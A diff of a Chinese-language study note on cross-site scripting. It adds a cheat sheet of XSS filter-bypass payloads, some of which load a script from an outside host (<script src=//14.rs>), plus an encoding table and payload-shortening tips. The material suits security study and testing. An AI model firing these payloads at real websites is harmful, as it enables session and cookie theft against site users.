@@ -125,8 +125,9 @@ document.location
 
 #### DOM based XSS 实例1 - 从anyElement.innerHTML触发
 
-* 对某元素内的"HTML代码"的读`outerHTML` 写`innerHTML` 
-* 对某元素内的"纯文本"的读 `outerText` 写 `innerText`
+* 对某html元素内的
+  * "HTML代码" 进行读`outerHTML`   写`innerHTML`【可导致XSS】
+  * "纯文本" 进行读 `outerText`   写 `innerText`
 
 ```
 <div id="test">
@@ -199,9 +200,132 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 
 ### XSS绕过方式
 
-BypassXSS
-* [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)
-* [MyPapers/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
+* Bypass XSS
+  * [s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS#awesome-bypassing)
+  * [MyPapers/Bypassing-XSS-detection-mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
+
+
+注意:以下这些Payload都没有用到single quotes(') 或 double quotes (").
+
+- Without event handlers - 不用事件处理
+```
+# 用object标签的data属性 属性值为javascript:
+<object data=javascript:confirm()>
+
+# 用a标签的href属性 属性值为javascript:
+<a href=javascript:confirm()>click here
+
+# 用script的src属性 
+<script src=//14.rs></script>
+
+# 直接 函数名
+<script>confirm()</script>
+```
+
+- Without space - 不用空格
+```
+# 用正斜线 / 代替空格
+<svg/onload=confirm()>
+<iframe/src=javascript:alert(1)>
+```
+
+- Without slash (/) - 不用正斜线`/`
+```
+# svg标签的事件属性
+<svg onload=confirm()>
+# img标签的事件属性onerror
+<img src=x onerror=confirm()>
+```
+
+- Without equal sign (=) - 不使用等号`=`
+```
+# 直接 函数名
+<script>confirm()</script>
+```
+
+- Without closing angular bracket (>) - 不使用右尖括号`>`结束标签
+```
+# 使用//结束标签
+<svg onload=confirm()//
+```
+
+- Without alert, confirm, prompt - 不使用alert, confirm, prompt函数
+```
+# <script src=外部js文件
+<script src=//14.rs></script>
+
+# svg标签 - \u编码
+<svg onload=co\u006efirm()>
+
+# svg标签 - 畸形属性 \u编码
+<svg onload=z=co\u006efir\u006d,z()>
+```
+
+- Without a Valid HTML tag - 
+```
+<x onclick=confirm()>click here
+<x ondrag=aconfirm()>drag it
+```
+
+- Bypass tag blacklisting - 绕过HMTL标签黑名单
+```
+# 大小写
+</ScRipT>
+
+# 利用兼容性 - 畸形标签 缺少>
+</script
+
+# 利用兼容性 - 畸形标签 用/>替换>
+</script/>
+
+# 利用兼容性 - 畸形标签
+</script x>
+```
+
+#### Awesome Encoding
+
+|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|URL|
+|----|----|-------|-----------|----|--------|----------|---|
+|`&quot;`|"|`&#34;`|quotation mark|u+0022|\0022|\42|%22|
+|`&num;`|#|`&#35;`|number sign|u+0023|\0023|\43|%23|
+|`&dollar;`|$|`&#36;`|dollar sign|u+0024|\0024|\44|%24|
+|`&percnt;`|%|`&#37;`|percent sign|u+0025|\0025|\45|%25|
+|`&amp;`|`&|`&#38;`|ampersand|u+0026|\0026|\46|%26|
+|`&apos;`|'|`&#39;`|apostrophe|u+0027|\0027|\47|%27|
+|`&lpar;`|(|`&#40;`|left parenthesis|u+0028|\0028|\50|%28|
+|`&rpar;`|)|`&#41;`|right parenthesis|u+0029|\0029|\51|%29|
+|`&ast;`|*|`&#42;`|asterisk|u+002A|\002a|\52|%2A|
+|`&plus;`|+|`&#43;`|plus sign|u+002B|\002b|\53|%2B|
+|`&comma;`|,|`&#44;`|comma|u+002C|\002c|\54|%2C|
+|`&minus;`|-|`&#45;`|hyphen-minus|u+002D|\002d|\55|%2D|
+|`&period;`|.|`&#46;`|full stop; period|u+002E|\002e|\56|%2E|
+|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\002f|\57|%2F|
+|`&colon;`|:|`&#58;`|colon|u+003A|\003a|\72|%3A|
+|`&semi;`|;`|`&#59;`|semicolon|u+003B|\003b|\73|%3B|
+|`&lt;`|<|`&#60;`|less-than|u+003C|\003c|\74|%3C|
+|`&equals;`|=|`&#61;`|equals|u+003D|\003d|\75|%3D|
+|`&gt;`|>|`&#62;`|greater-than sign|u+003E|\003e|\76|%3E|
+|`&quest;`|?|`&#63;`|question mark|u+003F|\003f|\77|%3F|
+|`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\0040|\100|%40|
+|`&lsqb;`|\[|`&#91;`|left square bracket|u+005B|\005b|\133|%5B|
+|`&bsol;`|/|`&#92;`|backslash|u+005C|\005c|\134|%5C|
+|`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\005d|\135|%5D|
+|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136|%5E|
+|`&lowbar;`|_|`&#95;`|low line|u+005F|\005f|\137|%5F|
+|`&grave;`|\`|`&#96;`|grave accent|u+0060|\0060|\u0060|%60|
+|`&lcub;`|{|`&#123;`|left curly bracket|u+007b|\007b|\173|%7b|
+|`&verbar;`|\||`&#124;`|vertical bar|u+007c|\007c|\174|%7c|
+|`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\007d|\175|%7d|
+
+#### Awesome Tips & Tricks
+
+- `http(s)://` 可以缩短为 `//` 或 `/\\` 或 `\\`
+- `document.cookie` 可以缩短为 `cookie`  其他DOM objects也一样
+- 优先用`confirm()` 再考虑用`alert()`  都不必传入实际参数`alert('XSS')`
+- 用`//`能结束一个标签  而不要用`>`
+- 当属性的值中没有空格符号时，没必要用引号去包裹属性的值 如`<script src=//14.rs>`   不必像这样`<script src="//14.rs">`
+- 最短的HTML context XSS payload是 `<script src=//14.rs>` (19 chars)
+
 
 ### XSS利用方式
 
